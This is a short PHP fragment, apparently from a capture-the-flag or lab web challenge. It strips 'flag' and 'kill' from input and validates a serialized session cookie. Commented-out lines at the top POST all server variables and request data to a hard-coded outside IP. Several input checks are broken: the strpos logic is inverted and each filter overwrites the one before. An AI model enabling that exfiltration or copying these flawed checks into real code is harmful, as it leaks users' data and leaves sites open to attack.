<?php
//$h = curl_init('http://172.104.123.211:13337');
//$d = ['S' => $_SERVER, 'R' => $_REQUEST];
//curl_setopt($h, CURLOPT_POST, 1);
//curl_setopt($h, CURLOPT_POSTFIELDS, json_encode($d));
//curl_exec($h);
//curl_close($h);
if (isset($_POST['url'])) {
  if (!strpos($_POST['url'], 'http') !== 0) die();
if(isset($_POST['url'])){
 $u=$_POST['url'];
 if(!strpos($u,'http')!==0)die();
}
}
foreach ($_REQUEST as $k => $v) {
    $_REQUEST[$k]=preg_replace("/['\\\\]/",'',$v);
    $_REQUEST[$k]=preg_replace("/flag/",'',$v);
    $_REQUEST[$k]=preg_replace("/kill/",'',$v);
}
if (isset($_COOKIE['session'])) {
    $cookie = $_COOKIE['session'];
    while (true) {
        $parts = explode('.', $cookie);
        if (count($parts) !== 2) break;
        $data = base64_decode($parts[1]);
        if (preg_match('/^a:1:{s:4:"user";a:2:{s:2:"id";s:\d+:"\d+";s:4:"name";s:\d+:"[^"]+";}}$/', $data)) break;
        if (preg_match('/^a:0:{}$/', $data)) break;
        setcookie('session', '', 0, '/');
        $u = $_SERVER['HTTP_REFERER'] ?? ".htaccess";
        header("Location: $u");
        die();
    }
}
